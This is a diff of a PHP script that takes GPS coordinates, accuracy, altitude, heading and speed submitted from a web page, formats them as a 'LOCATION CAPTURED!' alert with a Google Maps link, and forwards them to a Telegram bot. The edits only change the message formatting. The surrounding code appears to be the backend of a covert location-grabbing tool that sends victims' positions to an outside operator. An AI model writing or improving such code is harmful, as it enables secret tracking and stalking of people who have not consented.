@@ -17,15 +17,23 @@ $status = $_POST['Status'];
 $googleMapsLink = "https://www.google.com/maps?q=" . $lat . "," . $lon;
 
 // Format Message
+$acc_clean = round($acc, 1); 
+if ($alt < 0) {
+    $alt_text = round(abs($alt), 0) . " m below sea level";
+} else {
+    $alt_text = round($alt, 0) . " m above sea level";
+}
+
+// --- 2. CREATE THE MESSAGE ---
 $message = "<b>📍 LOCATION CAPTURED!</b>\n\n";
 
 $message .= "<b>🌎 Latitude:</b> <code>" . $lat . "</code>\n";
 $message .= "<b>🌎 Longitude:</b> <code>" . $lon . "</code>\n";
-$message .= "<b>🎯 Accuracy:</b> " . $acc . "\n";
-$message .= "<b>🏔 Altitude:</b> " . $alt . "\n"; 
+$message .= "<b>🎯 Accuracy:</b> <code>" . $acc_clean . " m</code>\n";
+$message .= "<b>🏔 Altitude:</b> " . $alt_text . "\n"; 
 $message .= "<b>🧭 Direction:</b> " . $dir . "\n";
 $message .= "<b>🚗 Speed:</b> " . $spd . "\n\n";
-$message .= "<b>🗺 <a href='" . $googleMapsLink . "'>Open in Google Maps</a></b>";
+$message .= "<b>🗺️ <a href='" . $googleMapsLink . "'>Open in Google Maps</a></b>";
 
 // Send to Telegram
 $website = "https://api.telegram.org/bot" . $botToken;
